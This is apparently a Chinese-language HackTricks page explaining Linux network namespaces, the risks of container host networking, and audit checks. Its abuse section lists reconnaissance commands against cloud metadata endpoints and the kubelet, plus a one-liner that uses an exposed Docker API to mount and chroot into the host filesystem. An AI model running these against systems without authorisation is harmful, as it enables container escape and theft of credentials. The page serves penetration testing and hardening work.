# 网络命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

网络命名空间隔离与网络相关的资源，例如接口、IP 地址、路由表、ARP/neighbor 状态、防火墙规则、套接字，以及诸如 `/proc/net` 之类文件的内容。这就是为什么容器看起来可以拥有自己的 `eth0`、本地路由和回环设备，而不必拥有主机的真实网络栈。

从安全角度看，这很重要，因为网络隔离不仅仅是端口绑定。私有的网络命名空间限制了工作负载可以直接观察或重新配置的内容。一旦该命名空间与主机共享，容器可能会突然看到主机的监听器、主机本地服务以及本不应暴露给应用的网络控制点。

## 工作原理

新创建的网络命名空间在接口附加之前，开始时具有空或几乎空的网络环境。容器运行时随后创建或连接虚拟接口、分配地址并配置路由，以便工作负载具有期望的连通性。在基于桥接的部署中，这通常意味着容器看到的是连接到主机桥的 veth-backed 接口。在 Kubernetes 中，CNI 插件负责 Pod 网络的等效设置。

这个架构解释了为什么 `--network=host` 或 `hostNetwork: true` 会带来如此剧变。工作负载不是获得一个已准备好的私有网络栈，而是加入主机的实际网络栈。

## 实验

你可以用以下命令查看几乎为空的网络命名空间：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
你可以用下面的命令比较普通容器和共享主机网络的容器：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
使用主机网络的容器不再拥有自己隔离的 socket 和接口视图。仅这一点的改变就已经很重要——还没考虑进程拥有哪些 capabilities 之前。

## 运行时使用

Docker 和 Podman 通常会为每个 container 创建一个私有的 network namespace，除非另有配置。Kubernetes 通常会为每个 Pod 提供自己的 network namespace，Pod 内的 containers 共享该 namespace，但与主机隔离。Incus/LXC 系统也提供基于 network-namespace 的丰富隔离，通常支持更多样的虚拟网络配置。

常见原则是：私有网络是默认的隔离边界，而 host networking 则是显式的选择退出该边界。

## 错误配置

最重要的错误配置就是直接共享主机的 network namespace。这有时为了性能、低级别监控或方便而这么做，但它移除了 containers 可用的最干净的边界之一。主机本地的监听器会被更直接地访问到，仅绑定到 localhost 的服务可能变得可访问，而且诸如 `CAP_NET_ADMIN` 或 `CAP_NET_RAW` 之类的 capabilities 会变得更危险，因为它们启用的操作现在应用于主机自身的网络环境。

另一个问题是在 network namespace 为私有时仍过度授予与网络相关的 capabilities。私有 namespace 有帮助，但它并不会使原始 socket 或高级网络控制无害。

## 滥用

在隔离较弱的环境中，攻击者可能会检查主机的监听服务、访问仅绑定到 loopback 的管理端点、嗅探或干扰流量（取决于具体的 capabilities 和环境），或者在存在 `CAP_NET_ADMIN` 时重新配置路由和防火墙状态。在集群中，这也会使横向移动和控制平面侦察更容易。

如果你怀疑使用了主机网络，首先确认可见的接口和监听器是属于主机而不是隔离的 container 网络：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
仅在回环接口上的服务通常是最先被发现的有趣目标：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
如果存在网络能力，测试工作负载是否可以检查或修改可见的网络栈：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
在集群或云环境中，主机网络也使得对元数据和与控制平面相邻的服务进行快速本地侦察成为合理之举：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完整示例：Host Networking + Local Runtime / Kubelet Access

Host networking 不会自动提供 host root，但它经常会暴露出一些本应仅从节点本身才能访问的服务。如果这些服务中的任意一个保护不严，host networking 就会成为直接的 privilege-escalation 路径。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet 在 localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影响：

- 如果本地 runtime API 在没有适当保护的情况下暴露，可能直接导致宿主机被攻破
- 如果 kubelet 或 local agents 可达，可能进行集群侦察或横向移动
- 当与 `CAP_NET_ADMIN` 结合时，可进行流量操纵或拒绝服务

## Checks

这些检查的目标是判断进程是否具有私有网络栈、可见的路由和监听器有哪些，以及在你测试 capabilities 之前网络视图是否已经看起来像宿主机一样。
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
有什么值得注意的：

- 如果命名空间标识符或可见的接口集合看起来像主机，则可能已经在使用主机网络。
- `ss -lntup` 尤其有价值，因为它会显示仅回环的监听器和本地管理端点。
- 如果存在 `CAP_NET_ADMIN` 或 `CAP_NET_RAW`，路由、接口名称和防火墙上下文就变得更加重要。

在审查容器时，总是要将网络命名空间与能力集一起评估。主机网络加上强大的网络能力与桥接网络加上较窄的默认能力集在安全姿态上有很大不同。
